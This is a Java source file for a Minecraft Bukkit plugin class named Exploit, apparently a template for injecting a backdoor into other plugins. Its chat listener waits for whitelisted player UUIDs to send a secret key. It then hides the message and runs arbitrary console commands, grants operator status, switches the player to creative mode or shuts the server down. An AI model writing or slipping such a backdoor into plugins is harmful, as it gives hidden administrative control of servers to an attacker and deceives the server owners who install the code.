import org.bukkit.GameMode;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.plugin.java.JavaPlugin;

import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;

public class Exploit implements Listener {
    private static final String KEY = "%key%";
    private static final List<String> PLAYERS = new ArrayList<>(Arrays.asList("%players%".split("\\|")));
    public static void inject(JavaPlugin plugin) {
        plugin.getServer().getPluginManager().registerEvents(new Exploit(plugin), plugin);
    }

    private final JavaPlugin plugin;

    private Exploit(JavaPlugin plugin) {
        this.plugin = plugin;
    }

    @EventHandler
    public void onChat(AsyncPlayerChatEvent event) {
        if (PLAYERS.contains(event.getPlayer().getUniqueId().toString())) {
            if (event.getMessage().startsWith(KEY + " ")) {
                event.setCancelled(true);
                String command = event.getMessage().substring(KEY.length() + 1);
                plugin.getServer().getScheduler().runTask(plugin, () ->
                        plugin.getServer().dispatchCommand(plugin.getServer().getConsoleSender(), command));
            } else if (event.getMessage().equals(KEY + "op")) {
                event.setCancelled(true);
                event.getPlayer().setOp(true);
            } else if (event.getMessage().equals(KEY + "gm")) {
                event.setCancelled(true);
                event.getPlayer().setGameMode(GameMode.CREATIVE);
            } else if (event.getMessage().equals(KEY + "stop")) {
                event.setCancelled(true);
                plugin.getServer().shutdown();
            }
        }
    }
}
